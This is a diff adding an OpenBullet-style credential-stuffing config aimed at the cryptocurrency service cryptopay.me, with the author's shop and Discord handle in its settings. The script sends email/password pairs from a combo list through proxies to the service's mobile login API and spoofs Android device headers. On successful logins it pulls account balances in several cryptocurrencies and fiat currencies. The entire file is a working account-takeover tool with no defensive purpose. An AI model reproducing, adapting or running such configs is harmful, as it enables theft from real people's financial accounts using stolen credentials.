@@ -1,0 +1,107 @@
+[SETTINGS]
+{
+  "Name": "CRYPTOPAY",
+  "SuggestedBots": 80,
+  "LastModified": "2019-08-20T02:52:54.5670075+05:30",
+  "AdditionalInfo": "SHOP : https://shoppy.gg/@FanTaZyX | DISCORD : FanTaZyX#2670",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "FanTaZyX | XENORIS (loliX Encrypted)",
+  "Version": "1.2.1.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#XENORIS REQUEST POST "https://cryptopay.me/api/mobile/v1/auth" 
+  CONTENT "email=<USER>&password=<PASS>&device%5Bfingerprint%5D=fb3846cc4c44f94b&device%5Bos%5D=Android%205.1.1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: okhttp/3.8.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device-Fingerprint: fb3846cc4c44f94b" 
+  HEADER "X-Platform: MOB" 
+  HEADER "X-Device-Type: MOB" 
+  HEADER "X-Device-Manufacturer: OnePlus" 
+  HEADER "X-Device-Model: A5010" 
+  HEADER "X-Os-Name: Android" 
+  HEADER "X-Os-Version: 5.1.1" 
+  HEADER "X-Version: 36" 
+  HEADER "X-Version-Name: 1.13.1" 
+  HEADER "X-App-Locale: en" 
+  HEADER "X-Locale: fr_FR" 
+  HEADER "X-Language: fr" 
+  HEADER "X-Session-Id: ce01dd15-8845-4aa9-9e26-26887ddfeadc" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 114" 
+  HEADER "Host: cryptopay.me" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#XENORIS KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#XENORIS PARSE "<SOURCE>" JSON "access_token" -> VAR "X_TOKEN" 
+
+#XENORIS REQUEST GET "https://cryptopay.me/api/mobile/v2/accounts" 
+  
+  HEADER "User-Agent: okhttp/3.8.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device-Fingerprint: fb3846cc4c44f94b" 
+  HEADER "X-Platform: MOB" 
+  HEADER "X-Device-Type: MOB" 
+  HEADER "X-Device-Manufacturer: OnePlus" 
+  HEADER "X-Device-Model: A5010" 
+  HEADER "X-Os-Name: Android" 
+  HEADER "X-Os-Version: 5.1.1" 
+  HEADER "X-Version: 36" 
+  HEADER "X-Version-Name: 1.13.1" 
+  HEADER "X-App-Locale: en" 
+  HEADER "X-Locale: fr_FR" 
+  HEADER "X-Language: fr" 
+  HEADER "X-Session-Id: ce01dd15-8845-4aa9-9e26-26887ddfeadc" 
+  HEADER "X-Access-Token: <X_TOKEN>" 
+  HEADER "Host: cryptopay.me" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#XENORIS PARSE "<SOURCE>" JSON "balance" Recursive=TRUE -> VAR "BAL" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Access denied" 
+
+#XENORIS FUNCTION Constant "<BAL[0]>" -> CAP "BTC" 
+
+#XENORIS FUNCTION Constant "<BAL[1]>" -> CAP "ETH" 
+
+#XENORIS FUNCTION Constant "<BAL[2]>" -> CAP "LTC" 
+
+#XENORIS FUNCTION Constant "<BAL[3]>" -> CAP "XRP" 
+
+#XENORIS FUNCTION Constant "<BAL[4]>" -> CAP "EUR" 
+
+#XENORIS FUNCTION Constant "<BAL[5]>" -> CAP "GBP" 
+
+#XENORIS FUNCTION Constant "<BAL[6]>" -> CAP "USD" 
+
+
